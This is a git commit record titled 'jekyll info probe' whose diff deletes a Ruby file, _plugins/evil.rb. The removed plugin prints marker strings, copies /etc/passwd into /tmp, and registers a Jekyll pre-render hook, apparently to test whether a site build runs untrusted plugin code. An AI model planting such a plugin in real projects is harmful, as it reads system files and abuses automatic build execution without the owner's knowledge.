b3f48f5c5050e1806f4b0250f8f779f2588775c4
Fox <fox@example.com>
2026-04-29 16:07:21 -0400

    m8: jekyll info probe

--- _plugins/evil.rb
+++
@@ -1,6 +0,0 @@
-# Try to load a custom plugin
-puts "EVIL_PLUGIN_LOADED"
-File.write("/tmp/evil_pages.txt", File.read("/etc/passwd")) rescue nil
-Jekyll::Hooks.register :site, :pre_render do |site|
-  puts "EVIL_HOOK_RAN"
-end if defined?(Jekyll)
